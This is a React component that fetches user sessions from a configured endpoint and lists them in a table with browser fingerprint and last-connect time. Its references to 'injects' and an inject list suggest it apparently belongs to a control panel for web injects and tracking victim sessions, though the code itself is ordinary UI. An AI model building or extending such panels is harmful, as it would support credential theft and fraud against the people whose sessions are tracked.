import React from 'react';
import SessionRow from './SessionRow';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';


class SessionTable extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
          error: null,
          isLoaded: false,
          arrayFiles: []
        };
    }
    
    componentDidMount() {
        this.onLoadJson();
    }

    componentWillReceiveProps() {
        this.onLoadJson();
    }

    onLoadJson () {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"get_user_session"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    this.setState({
                        isLoaded: true,
                        arrayFiles: result.session
                    });
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading injects. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () { 
        const Px70Width = {
            marginLeft: '5px',
            width: '1px',
            textAlign: 'center',
            fontSize: '20px'
        }

        const font26 = {
            fontSize: '22px',
            textAlign: 'center'
        }


        if (!this.state.isLoaded) {
            return <div class="load-4"><div class="ring-1"></div></div>
        }
        return (
            <React.Fragment>
                <table class="table table-striped table-hover">
                    <thead class="thead-light">
                        <tr>
                        <th scope="col" style={Px70Width}><span>User session</span></th>
                        <th scope="col" style={Px70Width}><span>Fingerprint browser</span></th>
                        <th scope="col" style={Px70Width}><span>Last connect</span></th>
                        <th scope="col" style={Px70Width}></th>
                        </tr>
                    </thead>
                    <tbody>
                        {this.state.arrayFiles.map(item => (
                        <SessionRow InjListForceUpdate={this.props.InjListForceUpdate} session_id={item.sid} fingerprint={item.frp} last_date={item.l_dt} closed={item.cld}/>
                        ))}
                    </tbody>
                </table>
            </React.Fragment>
        );
    }

}

export default SessionTable;